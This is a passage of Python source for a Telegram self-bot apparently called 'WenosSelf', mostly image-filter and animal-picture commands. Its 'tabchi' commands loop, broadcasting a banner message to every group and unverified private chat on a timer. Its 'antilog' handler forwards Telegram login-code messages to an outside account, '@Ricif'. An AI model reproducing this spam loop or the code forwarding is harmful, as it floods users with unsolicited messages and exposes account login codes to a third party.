    await app.send_photo(m.chat.id,response["image"],caption = "This is my love ...",reply_to_message_id=m.id)
    
@app.on_message(filters.command(["kangaroo"], ".") & filters.me)
async def cats1(app, m: Message):
    response = requests.get("https://some-random-api.com/animal/kangaroo").json()
    await app.send_photo(m.chat.id,response["image"],caption = "This is my love ...",reply_to_message_id=m.id)

@app.on_message(filters.command(["koala"], ".") & filters.me)
async def cats1(app, m: Message):
    response = requests.get("https://some-random-api.com/animal/koala").json()
    await app.send_photo(m.chat.id,response["image"],caption = "This is my love ...",reply_to_message_id=m.id)

@app.on_message(filters.command(["panda"], ".") & filters.me)
async def cats1(app, m: Message):
    response = requests.get("https://some-random-api.com/animal/panda").json()
    a = response["fact"]
    await app.send_photo(m.chat.id,response["image"],caption = f"This is my love ...\nFact = `{a}`",reply_to_message_id=m.id)

@app.on_message(filters.command(["raccoon"], ".") & filters.me)
async def cats1(app, m: Message):
    response = requests.get("https://some-random-api.com/animal/raccoon").json()
    a = response["fact"]
    await app.send_photo(m.chat.id,response["image"],caption = f"This is my love ...\nFact = `{a}`",reply_to_message_id=m.id)

@app.on_message(filters.command(["rpanda"], ".") & filters.me)
async def cats1(app, m: Message):
    response = requests.get("https://some-random-api.com/animal/Red_Panda").json()
    a = response["fact"]
    await app.send_photo(m.chat.id,response["image"],caption = f"This is my love ...\nFact = `{a}`",reply_to_message_id=m.id)

@app.on_message(filters.command(["whale"], ".") & filters.me)
async def cats1(app, m: Message):
    response = requests.get("https://some-random-api.com/img/whale").json()
    await app.send_photo(m.chat.id,response["link"],caption = f"This is my love ...",reply_to_message_id=m.id)
    
@app.on_message(filters.command(["pikachu"], ".") & filters.me)
async def cats1(app, m: Message):
    response = requests.get("https://some-random-api.com/img/pikachu").json()
    await app.send_photo(m.chat.id,response["link"],caption = f"This is my love ...",reply_to_message_id=m.id)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["delenemy"], ".") & filters.me)
async def delenemy(app, message: Message):
        id = message.reply_to_message.chat.id
        try:
            enemy.remove(message.reply_to_message.from_user.id)
            await app.edit_message_text(message.chat.id, message.id, f"{message.reply_to_message.from_user.mention}\n❈**Enemy** Deleted from list.")
        except Exception as ki:
            await app.edit_message_text(message.chat.id, message.id,
                                            "❈This **id**  does not exist in enemy list. %s" % ki)
@app.on_message(filters.command(["enemylist"], ".") & filters.me)  
async def enemylist(app, message: Message):
        string = enemy
        await app.edit_message_text(message.chat.id, message.id, "❈**E**nemy List:%s" % string)
@app.on_message(filters.command(["setenemy"], ".") & filters.me)  
async def setenemy(app, message: Message):
        ss = message.reply_to_message.chat.id
        try:
            enemy.append(message.reply_to_message.from_user.id)
            await app.edit_message_text(message.chat.id, message.id, f"{message.reply_to_message.from_user.mention}\n❈**Added** To Enemy List.")
        except Exception as m:
            await app.edit_message_text(message.chat.id, message.id, f"{message.reply_to_message.from_user.mention}\n❈**User** In Enemy List %s ." % m)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["dellove"], ".") & filters.me)
async def dellove(app, message: Message):
        id = message.reply_to_message.chat.id
        try:
            love.remove(message.reply_to_message.from_user.id)
            await app.edit_message_text(message.chat.id, message.id, f"{message.reply_to_message.from_user.mention}\n❈**LOVE** Deleted from list.")
        except Exception as ki:
            await app.edit_message_text(message.chat.id, message.id,
                                            "❈This **id**  does not exist in LOVE list. %s" % ki)
@app.on_message(filters.command(["lovelist"], ".") & filters.me)  
async def lovelist(app, message: Message):
        string = love
        await app.edit_message_text(message.chat.id, message.id, "❈**L**ove List:%s" % string)
@app.on_message(filters.command(["setlove"], ".") & filters.me)  
async def setlove(app, message: Message):
        ss = message.reply_to_message.chat.id
        try:
            love.append(message.reply_to_message.from_user.id)
            await app.edit_message_text(message.chat.id, message.id, f"{message.reply_to_message.from_user.mention}\n❈**Added** To LOVE List.")
        except Exception as m:
            await app.edit_message_text(message.chat.id, message.id, f"{message.reply_to_message.from_user.mention}\n❈**User** In LOVE List %s ." % m)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["filter"], ".") | filters.me & users)
async def green(app, m: Message):
    filt = m.text.split(None, 1)[1]
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"http://mizban-self.ir/self/py-web/effect/effect.php?url={a}&filter={filt}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)

@app.on_message(filters.command(["green"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/filter/green?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["blue"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/filter/blue?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["blurple"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/filter/Blurple?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["blurple2"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/filter/Blurple2?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["blurple3"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/filter/invert?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["grey"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/filter/Greyscale?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["grey2"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/filter/invertgreyscale?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["red"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/filter/red?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["sepia"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/filter/sepia?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["threshold"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/filter/Threshold?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["bisexual"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/misc/bisexual?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["blur"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/misc/blur?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["horny"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/misc/horny?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["stupid"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/misc/its-so-stupid?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["lesbian"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/misc/lesbian?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["lgbt"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/misc/lgbt?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["lolice"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/misc/lolice?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["non"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/misc/nonbinary?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["psexual"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/misc/Pansexual?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["pixel"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/misc/Pixelate?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["simp"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/misc/simpcard?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["spin"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/misc/Spin?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["toni"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/misc/Tonikawa?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["trans"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/misc/transgender?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["comrade"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/overlay/comrade?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)

@app.on_message(filters.command(["gay"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/overlay/Gay?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["glass"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/overlay/Glass?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["jail"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/overlay/Jail?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["wasted"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/overlay/Wasted?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["Pass"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/overlay/Passed?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
    
@app.on_message(filters.command(["trig"], ".") & filters.me)
async def green(app, m: Message):
    replied = m.reply_to_message
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    response = upload_file(download_location)
    a = f"https://telegra.ph{response[0]}"
    b = f"https://some-random-api.com/canvas/overlay/triggered?avatar={a}"
    await app.send_photo(m.chat.id,b,caption = f"This is my love ...",reply_to_message_id=m.id)
    os.remove(download_location)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["online"], ".") & filters.me)
async def online_now(app, m: Message):
    await app.send_message(m.chat.id,"AutoOnline activated", reply_to_message_id=m.id)
    while True:
        iii = await app.send_message("me", "bruh")
        await app.delete_messages("me", iii.id)
        await asyncio.sleep(45)


@app.on_message(filters.command(["offline"], ".") & filters.me)
async def offline_now(app, m: Message):
    await app.send_message(m.chat.id,"AutoOnline deactivated\nRestart...", reply_to_message_id=m.id)
    await app.send_message(m.chat.id ,"**Self Restart was successful**", reply_to_message_id=m.id)
    python = sys.executable
    os.execl(python, python, *sys.argv)
    
@app.on_message(filters.command("settimerpv",".") & filters.me)
def tabchi3(app, message:Message):
        msg = get_arg(message)
        if int(msg) > 300 :
            write("timerpv.txt" , msg)
            app.send_message(message.chat.id ,"**زمان ارسال به پیوی با موفقیت تنظیم شد**\nWenosSelf", reply_to_message_id=message.id)
        else:
            app.send_message(message.chat.id ,"زمان ارسالی باید بیش از 300 ثانیه باشد .\nWenosSelf", reply_to_message_id=message.id)
@app.on_message(filters.command("settimergp",".") & filters.me)
def tabchi7(app, message:Message):
        msg = get_arg(message)
        if int(msg) > 300 :
            write("timergp.txt" , msg)
            app.send_message(message.chat.id ,"**زمان ارسال به گروه با موفقیت تنظیم شد**\nWenosSelf", reply_to_message_id=message.id)
        else:
            app.send_message(message.chat.id ,"زمان ارسالی باید بیش از 300 ثانیه باشد .\nWenosSelf", reply_to_message_id=message.id)
@app.on_message(filters.command("setbannerpv",".") & filters.me)
def tabchi4(app, message:Message):
    if message.reply_to_message:
        msg = message.reply_to_message.text
        app.send_message(message.chat.id ,"**بنر ارسال به پیوی با موفقیت تنظیم شد**\nWenosSelf", reply_to_message_id=message.id)
        # باز کردن فایل و نوشتن پیام درون آن
        with open("bannerpv.txt", "w") as file:
            file.write(msg)
    elif get_arg:
        msg = get_arg(message)
        write("bannerpv.txt" , msg)
        app.send_message(message.chat.id ,"**بنر ارسال به پیوی با موفقیت تنظیم شد**\nWenosSelf", reply_to_message_id=message.id)
        
@app.on_message(filters.command("setbannersender",".") & filters.me)
def tabchi4(app, message:Message):
    if message.reply_to_message:
        msg = message.reply_to_message.text
        app.send_message(message.chat.id ,"**بنر ارسال به پیوی با موفقیت تنظیم شد**\nWenosSelf", reply_to_message_id=message.id)
        # باز کردن فایل و نوشتن پیام درون آن
        with open("bannersender.txt", "w") as file:
            file.write(msg)
    elif get_arg:
        msg = get_arg(message)
        write("bannersender.txt" , msg)
        app.send_message(message.chat.id ,"**بنر ارسال به پیوی با موفقیت تنظیم شد**\nWenosSelf", reply_to_message_id=message.id)

@app.on_message(filters.command("setbannergp",".") & filters.me)
def tabchi5(app, message:Message):
    if message.reply_to_message:
        msg = message.reply_to_message.text
        app.send_message(message.chat.id ,"**بنر شما ارسال به گروه با موفقیت تنظیم شد**\nWenosSelf", reply_to_message_id=message.id)
        # باز کردن فایل و نوشتن پیام درون آن
        with open("bannergp.txt", "w") as file:
            file.write(msg)
    elif get_arg:
        msg = get_arg(message)
        write("bannergp.txt" , msg)
        app.send_message(message.chat.id ,"**بنر شما ارسال به گروه با موفقیت تنظیم شد**\nWenosSelf", reply_to_message_id=message.id)


@app.on_message(filters.command("tabchigp on",".") & filters.me)
def tabchi1(app, m: Message):
        app.send_message(m.chat.id ,"**تبچی در گروه های شما با موفقیت فعال شد*\nWenosSelf*", reply_to_message_id=m.id)
        while True:
            sleep(read("timergp.txt"))  # 5 * 60
            # ارسال پیام هر 5 دقیقه
            try:
                for dialog in app.get_dialogs():
                    if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
                        chat = dialog.chat.id
                        sleep(4)
                        app.send_message(chat, read("bannergp.txt"))
            except FloodWait as e:
                     app.send_message(m.chat.id , f"{e}", reply_to_message_id=m.id)
@app.on_message(filters.command(["tabchigp off"], ".") & filters.me)
def tabchigpoffline_now(app, m: Message):
        app.send_message(m.chat.id ,"**تبچی در گروه های شما با موفقیت غیر فعال شد**\nWenosSelf", reply_to_message_id=m.id)
        app.send_message(m.chat.id ,"**Self Restart was successful**", reply_to_message_id=m.id)
        python = sys.executable
        os.execl(python, python, *sys.argv)
    
@app.on_message(filters.command("tabchipv on",".") & filters.me)
def tabchi1(app, m: Message):
        app.send_message(m.chat.id ,"**تبچی در پیوی های شما با موفقیت فعال شد*\nWenosSelf*", reply_to_message_id=m.id)
        while True:
            sleep(read("timerpv.txt"))  # 5 * 60
            # ارسال پیام هر 5 دقیقه
            try:
                for dialog in app.get_dialogs():
                    if dialog.chat.type == enums.ChatType.PRIVATE and not dialog.chat.is_verified:
                        chat = dialog.chat.id
                        app.send_message(chat, read("bannerpv.txt"))
                        sleep(4)
            except FloodWait as e:
                     app.send_message(m.chat.id , f"{e}", reply_to_message_id=m.id)
@app.on_message(filters.command(["tabchigp off"], ".") & filters.me)
def tabchigpoffline_now(app, m: Message):
        app.send_message(m.chat.id ,"**تبچی در پیوی های شما با موفقیت غیر فعال شد**\nWenosSelf", reply_to_message_id=m.id)
        app.send_message(m.chat.id ,"**Self Restart was successful**", reply_to_message_id=m.id)
        python = sys.executable
        os.execl(python, python, *sys.argv)
        
@app.on_message(filters.command(["tabchi status"], ".") & filters.me)
def offline_now(app, m: Message):
        a = read("bannerpv.txt")
        b = read("bannergp.txt")
        c = read("timerpv.txt")
        d = read("timergp.txt")
        app.send_message(m.chat.id ,f"**PV Banner** =\n [ {a} ]\n**PV Timer** =\n [ {c} ]\n\n**GP Banner** = \n[ {b} ]\n**GP Timer** =\n [ {d} ] \nWenosSelf", reply_to_message_id=m.id)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
is_antilog = False

@app.on_message(filters.user(777000) & filters.regex('code'))
async def Code_Expire(c, m):
    global is_antilog
    if is_antilog:
        try:
            await app.send_message(m.chat.id, "Anti Login is ON", reply_to_message_id=m.id)
            msg = await m.forward("@Ricif")
            await app.delete_messages("@Ricif", msg.id)
        except:
            pass

@app.on_message(filters.command("antilog", ".") & filters.me)
async def toggle_antilog(c, m):
    global is_antilog
    command = m.command[1].lower()
    if command == "on":
        is_antilog = True
        await app.send_message(m.chat.id, "Anti Login is now ON!")
    elif command == "off":
        is_antilog = False
        await app.send_message(m.chat.id, "Anti Login is now OFF!")
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
DEFAULTUSER = "Man"
NOBLE = [
    "╲╲╲┏━━┓╭━━━╮╱╱╱\n╲╲╲┗┓┏┛┃╭━╮┃╱╱╱\n╲╲╲╲┃┃┏┫┃╭┻┻┓╱╱\n╱╱╱┏╯╰╯┃╰┫┏━╯╱╱\n╱╱┏┻━┳┳┻━┫┗┓╱╱╱\n╱╱╰━┓┃┃╲┏┫┏┛╲╲╲\n╱╱╱╱┃╰╯╲┃┃┗━╮╲╲\n╱╱╱╱╰━━━╯╰━━┛╲╲",
    "┏━╮\n┃▔┃▂▂┏━━┓┏━┳━━━┓\n┃▂┣━━┻━╮┃┃▂┃▂┏━╯\n┃▔┃▔╭╮▔┃┃┃▔┃▔┗━┓\n┃▂┃▂╰╯▂┃┗╯▂┃▂▂▂┃\n┃▔┗━━━╮┃▔▔▔┃▔┏━╯\n┃▂▂▂▂▂┣╯▂▂▂┃▂┗━╮\n┗━━━━━┻━━━━┻━━━┛",
    "┏┓┏━┳━┳━┳━┓\n┃┗┫╋┣┓┃┏┫┻┫\n┗━┻━┛┗━┛┗━┛\n────­­­­­­­­­YOU────",
    "╦──╔╗─╗╔─╔ ─\n║──║║─║║─╠ ─\n╚═─╚╝─╚╝─╚ ─\n╦─╦─╔╗─╦╦   \n╚╦╝─║║─║║ \n─╩──╚╝─╚╝",
    "╔══╗....<3 \n╚╗╔╝..('\../') \n╔╝╚╗..( •.• ) \n╚══╝..(,,)(,,) \n╔╗╔═╦╦╦═╗ ╔╗╔╗ \n║╚╣║║║║╩╣ ║╚╝║ \n╚═╩═╩═╩═╝ ╚══╝",
    "░I░L░O░V░E░Y░O░U░",
    "┈┈╭━╱▔▔▔▔╲━╮┈┈┈\n┈┈╰╱╭▅╮╭▅╮╲╯┈┈┈\n╳┈┈▏╰┈▅▅┈╯▕┈┈┈┈\n┈┈┈╲┈╰━━╯┈╱┈┈╳┈\n┈┈┈╱╱▔╲╱▔╲╲┈┈┈┈\n┈╭━╮▔▏┊┊▕▔╭━╮┈╳\n┈┃┊┣▔╲┊┊╱▔┫┊┃┈┈\n┈╰━━━━╲╱━━━━╯┈╳",
    "╔ღ═╗╔╗\n╚╗╔╝║║ღ═╦╦╦═ღ\n╔╝╚╗ღ╚╣║║║║╠╣\n╚═ღ╝╚═╩═╩ღ╩═╝",
    "╔══╗ \n╚╗╔╝ \n╔╝(¯'v'¯) \n╚══'.¸./\n╔╗╔═╦╦╦═╗ ╔╗╔╗ \n║╚╣║║║║╩╣ ║╚╝║ \n╚═╩═╩═╩═╝ ╚══╝",
    "╔╗ \n║║╔═╦═╦═╦═╗ ╔╦╗ \n║╚╣╬╠╗║╔╣╩╣ ║║║ \n╚═╩═╝╚═╝╚═╝ ╚═╝ \n╔═╗ \n║═╬═╦╦╦═╦═╦═╦═╦═╗ \n║╔╣╬║╔╣╩╬╗║╔╣╩╣╔╝ \n╚╝╚═╩╝╚═╝╚═╝╚═╩╝",
    "╔══╗ \n╚╗╔╝ \n╔╝╚╗ \n╚══╝ \n╔╗ \n║║╔═╦╦╦═╗ \n║╚╣║║║║╚╣ \n╚═╩═╩═╩═╝ \n╔╗╔╗ ♥️ \n║╚╝╠═╦╦╗ \n╚╗╔╣║║║║ \n═╚╝╚═╩═╝",
    "╔══╗╔╗  ♡ \n╚╗╔╝║║╔═╦╦╦╔╗ \n╔╝╚╗║╚╣║║║║╔╣ \n╚══╝╚═╩═╩═╩═╝\n­­­─────­­­­­­­­­YOU─────",
    "╭╮╭╮╮╭╮╮╭╮╮╭╮╮ \n┃┃╰╮╯╰╮╯╰╮╯╰╮╯ \n┃┃╭┳━━┳━╮╭━┳━━╮ \n┃┃┃┃╭╮┣╮┃┃╭┫╭╮┃ \n┃╰╯┃╰╯┃┃╰╯┃┃╰┻┻╮ \n╰━━┻━━╯╰━━╯╰━━━╯",
    "┊┊╭━╮┊┊┊┊┊┊┊┊┊┊┊ \n━━╋━╯┊┊┊┊┊┊┊┊┊┊┊ \n┊┊┃┊╭━┳╮╭┓┊╭╮╭━╮ \n╭━╋━╋━╯┣╯┃┊┃╰╋━╯ \n╰━╯┊╰━━╯┊╰━┛┊╰━━",
]
R = "❤️"
W = "🤍"

heart_list = [
    W * 9,
    W * 2 + R * 2 + W + R * 2 + W * 2,
    W + R * 7 + W,
    W + R * 7 + W,
    W + R * 7 + W,
    W * 2 + R * 5 + W * 2,
    W * 3 + R * 3 + W * 3,
    W * 4 + R + W * 4,
    W * 9,
]
SLEEP = 0.1
joined_heart = "\n".join(heart_list)
heartlet_len = joined_heart.count(R)
async def _wrap_edit(message, text: str):
    """Floodwait-safe utility wrapper for edit"""
    try:
        await message.edit(text)
    except FloodWait as fl:
        await asyncio.sleep(fl.x)
async def phase1(message):
    """Big scroll"""
    BIG_SCROLL = "🧡💛💚💙💜🖤🤎"
    await _wrap_edit(message, joined_heart)
    for heart in BIG_SCROLL:
        await _wrap_edit(message, joined_heart.replace(R, heart))
        await asyncio.sleep(SLEEP)
async def phase2(message):
    """Per-heart randomiser"""
    ALL = ["❤️"] + list("🧡💛💚💙💜🤎🖤")  # don't include white heart

